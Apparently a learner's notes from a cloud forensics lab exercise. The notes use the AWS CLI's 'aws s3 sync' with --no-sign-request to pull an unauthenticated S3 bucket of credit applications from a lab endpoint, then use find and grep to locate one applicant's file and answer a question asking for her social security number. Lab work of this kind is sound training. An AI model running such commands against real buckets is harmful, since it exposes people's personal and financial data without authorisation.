Question 4 of 4
What is Carla Rileyâ€™s social security number?


I'm going to look up how to use the cp and sync command:
run aws s3 cp help

cp <LocalPath><S3Uri> or <S3Uri><LocalPath> or <S3Uri><S3Uri>

--dryrun
--include <value>
--acl<value>
cp didn't copy

Tried sync, worked!
aws --endpoint-url http://10.102.8.154 s3 sync  s3://immersive-credit-applications/ /home/forensics/Documents --include Riley --no-sign-request

Ok, this gave more than Riley, way more.

find command?
Couldn't quite get it to find the file, so let's output the text to a file and then grep from that file.
find ~/Documents *carla_riley -print >> 0000.txt 
cat 0000.txt | grep riley

/home/forensics/Documents/2020-03-12/17:00:16/9008-carla_riley
